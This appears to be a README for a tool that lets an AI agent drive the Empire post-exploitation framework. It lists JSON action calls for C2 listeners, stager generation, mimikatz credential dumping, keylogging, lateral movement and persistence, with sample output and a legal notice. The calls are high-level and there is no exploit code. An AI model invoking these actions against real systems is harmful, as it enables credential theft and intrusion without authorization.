# Empire PowerShell Tool

## Overview
The **Empire PowerShell Tool** is an advanced Empire PowerShell post-exploitation framework integration for sophisticated Windows post-exploitation operations. It provides comprehensive PowerShell-based attack capabilities including agent management, module execution, credential harvesting, lateral movement, and persistence mechanisms.

## Features
- **Agent Management**: Comprehensive agent lifecycle management
- **Module Execution**: Advanced PowerShell module execution
- **Credential Harvesting**: Comprehensive credential collection
- **Lateral Movement**: Advanced lateral movement capabilities
- **Persistence**: Multiple persistence mechanisms
- **Privilege Escalation**: Advanced privilege escalation techniques
- **Network Reconnaissance**: Advanced network reconnaissance
- **Payload Generation**: Custom payload generation and management
- **Cross-Platform**: Windows, Linux, macOS, Android, iOS support
- **Natural Language**: Conversational interface for post-exploitation operations

## Usage

### Empire Server Management
```bash
# Start Empire server
{
  "action": "start_empire",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Connect to Empire server
{
  "action": "connect_empire",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Agent Management
```bash
# List agents
{
  "action": "list_agents",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Interact with agent
{
  "action": "interact_agent",
  "agent_id": "agent_001",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Module Execution
```bash
# Execute module
{
  "action": "execute_module",
  "agent_id": "agent_001",
  "module_name": "powershell/credentials/mimikatz/logonpasswords",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### File Operations
```bash
# Upload file
{
  "action": "upload_file",
  "agent_id": "agent_001",
  "file_path": "/path/to/file.exe",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Download file
{
  "action": "download_file",
  "agent_id": "agent_001",
  "file_path": "C:\\temp\\file.txt",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Screenshot and Keylogger
```bash
# Take screenshot
{
  "action": "screenshot",
  "agent_id": "agent_001",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Start keylogger
{
  "action": "keylogger",
  "agent_id": "agent_001",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Lateral Movement
```bash
# Lateral movement
{
  "action": "lateral_movement",
  "agent_id": "agent_001",
  "target_host": "192.168.1.200",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Persistence
```bash
# Establish persistence
{
  "action": "persistence",
  "agent_id": "agent_001",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Privilege Escalation
```bash
# Privilege escalation
{
  "action": "privilege_escalation",
  "agent_id": "agent_001",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Credential Harvesting
```bash
# Harvest credentials
{
  "action": "credential_harvest",
  "agent_id": "agent_001",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Network Reconnaissance
```bash
# Network reconnaissance
{
  "action": "network_recon",
  "agent_id": "agent_001",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Port scan
{
  "action": "port_scan",
  "agent_id": "agent_001",
  "target": "192.168.1.0/24",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Service Enumeration
```bash
# Service enumeration
{
  "action": "service_enum",
  "agent_id": "agent_001",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Listener Management
```bash
# Create listener
{
  "action": "create_listener",
  "listener_name": "http_listener",
  "listener_type": "http",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# List listeners
{
  "action": "list_listeners",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Payload Generation
```bash
# Generate stager
{
  "action": "generate_stager",
  "stager_type": "multi/launcher",
  "listener_name": "http_listener",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Generate launcher
{
  "action": "generate_launcher",
  "launcher_type": "powershell",
  "listener_name": "http_listener",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Module Management
```bash
# Search modules
{
  "action": "search_modules",
  "search_term": "mimikatz",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Show module info
{
  "action": "show_module_info",
  "module_name": "powershell/credentials/mimikatz/logonpasswords",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Set module options
{
  "action": "set_module_options",
  "module_name": "powershell/credentials/mimikatz/logonpasswords",
  "module_options": {
    "Agent": "agent_001"
  },
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Run module
{
  "action": "run_module",
  "module_name": "powershell/credentials/mimikatz/logonpasswords",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Agent Management
```bash
# Agent management
{
  "action": "agent_management",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Log Analysis
```bash
# Analyze logs
{
  "action": "log_analysis",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Reporting
```bash
# Generate report
{
  "action": "reporting",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

### Custom Script
```bash
# Execute custom script
{
  "action": "custom_script",
  "agent_id": "agent_001",
  "script_content": "Get-Process | Where-Object {$_.ProcessName -eq 'notepad'}",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}
```

## Parameters

### Connection Parameters
- **empire_host**: Empire server host IP
- **empire_port**: Empire server port

### Agent Parameters
- **agent_id**: Agent ID for interaction
- **module_name**: Module name to execute
- **file_path**: File path for upload/download
- **target_host**: Target host for lateral movement

### Listener Parameters
- **listener_name**: Listener name
- **listener_type**: Listener type (http, https, dns, smb, tcp)
- **stager_type**: Stager type
- **launcher_type**: Launcher type

### Module Parameters
- **module_options**: Module options
- **script_content**: Custom PowerShell script content

### Safety Parameters
- **safe_mode**: Enable safe mode to prevent actual attacks
- **verbose**: Enable verbose output

## Output Format
```json
{
  "success": true,
  "action": "list_agents",
  "result": {
    "agents": [
      {
        "agent_id": "agent_001",
        "hostname": "TARGET-PC",
        "username": "user",
        "process": "powershell.exe",
        "pid": 1234,
        "arch": "x64",
        "os": "Windows 10",
        "last_seen": "2025-01-15T10:30:00Z",
        "status": "active"
      }
    ],
    "total_agents": 1
  }
}
```

## Cross-Platform Support
- **Windows**: Full support with native integration
- **Linux**: Complete functionality
- **macOS**: Full feature support
- **Android**: Mobile-optimized interface
- **iOS**: Native iOS integration

## Examples

### Example 1: Basic Agent Interaction
```bash
# List agents
{
  "action": "list_agents",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Result
{
  "success": true,
  "result": {
    "agents": [
      {
        "agent_id": "agent_001",
        "hostname": "TARGET-PC",
        "status": "active"
      }
    ]
  }
}
```

### Example 2: Module Execution
```bash
# Execute module
{
  "action": "execute_module",
  "agent_id": "agent_001",
  "module_name": "powershell/credentials/mimikatz/logonpasswords",
  "empire_host": "192.168.1.100",
  "empire_port": 1337
}

# Result
{
  "success": true,
  "result": {
    "module": "powershell/credentials/mimikatz/logonpasswords",
    "output": "Mimikatz output here...",
    "execution_time": "00:00:05"
  }
}
```

## Error Handling
- **Connection Errors**: Proper handling of Empire server connection issues
- **Authentication Errors**: Secure handling of authentication failures
- **Agent Errors**: Robust error handling for agent operations
- **Module Errors**: Safe handling of module execution failures

## Related Tools
- **Post-Exploitation**: Other post-exploitation tools
- **Penetration Testing**: Penetration testing tools
- **Network Security**: Network security analysis tools

## Version
- **Current Version**: 1.0.0
- **Last Updated**: September 2025
- **Compatibility**: MCP God Mode v1.9+

## Support
For issues or questions about the Empire PowerShell Tool, please refer to the main MCP God Mode documentation or contact the development team.

## Legal Notice
This tool is designed for authorized security testing and research only. Users must ensure they have proper authorization before using any Empire PowerShell capabilities. Unauthorized use may violate laws and regulations.
